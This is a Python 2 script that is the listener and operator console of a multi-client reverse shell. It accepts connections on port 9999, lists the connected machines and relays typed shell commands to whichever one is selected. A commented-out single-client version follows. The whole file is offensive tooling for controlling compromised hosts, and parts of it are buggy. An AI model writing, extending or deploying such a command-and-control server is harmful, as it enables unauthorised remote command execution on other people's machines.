import socket
import sys
import threading
import time
from Queue import Queue

NUMBER_OF_THREADS=2
JOB_NUMBER=[1,2]
queue=Queue()
all_connections=[]
all_addresses=[]



def socket_create():
        try:
            global host
            global port
            global s
            host=""
            port=9999
            s=socket.socket()
        except :
            print("socket creation error")

def socket_bind():
    try:
       global host
       global port 
       global s
       print("binding socket to port : "+str(port))
       s.bind((host,port))
       s.listen(5)        
    except:
       print("socket binding error:"+"\n"+"Retrying.....")
       time.sleep(5)
       socket_bind()

def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
           conn,address=s.accept()
           conn.setblocking(1)
           all_connections.append(conn)
           all_addresses.append(address)
           print("\n Connection has been established :"+address[0])
           start_drone()
        except:
           print("Error accepting connection")

def start_drone():
    while True:
             cmd=raw_input()
             if cmd=='list':
                   list_connections()
             elif 'select' in cmd :
                    conn=get_target(cmd)
                    if conn is not None :
                            send_target_commands(conn)

             else:
                 print('command not recognized')


def list_connections():
           results=''
           for i,conn in enumerate(all_connections):
               try:
                    conn.send(str(' '))
                    conn.recv(2048)
               except:
                    del all_connections[i]
                    del all_addresses[i]
                    continue
           results+=str(i)+ '   '+ str(all_addresses[i][0])+ '  ' +str(all_addresses[i][1])
           print('***** Clients *****'+'\n'+results)


def get_target(cmd):
    try:
        target=cmd.replace('select ','')
        target=int(target)
        conn=all_connections[target]
        print('Your are now connected to'+str(all_addresses[target][0]))
        print(str(all_addresses[target][0])+'$')
        return conn
    except:
        print('Not a valid selection')
        return None


def send_target_commands(conn):
        while True:
            try:
                cmd=raw_input()
                if len(str(cmd)) > 0:
                    conn.send(str(cmd))
                    client_response=str(conn.recv(2048))
                    print(client_response)
                if cmd=='quit':
                    break
            except:
                print('Connection Was Lost')
                break




def create_workers():
    for _ in range(NUMBER_OF_THREADS):
                t=threading.Thread(target=work)
                t.daemon=True
                t.start()



def work():
    while True :
           x=queue.get()
           if x==1:
              socket_create()
              socket_bind()
              accept_connections()
           if x==2:
              start_drone()
           queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
            queue.put(x)
    queue.join()



create_workers()

create_jobs()

#def socket_accept():
#     conn,address=s.accept()
#     print("Connection has been established | "+"IP"+address[0]+"| Port "+str(address[1]))
#     send_commands(conn)
#     conn.close()
#     
#
#def send_commands(conn):
#     while True:
#           cmd=raw_input()
#           if cmd=='quit':
#               conn.close()
#               s.close()
#               sys.exit()
#           if len(cmd) > 0 :
#               conn.send(str(cmd))
#               client_response=str(conn.recv(1024))
#               sys.stdout.write(client_response)
#
#
#def main():
#      socket_create()
#      socket_bind()
#      socket_accept()  
#
#main()
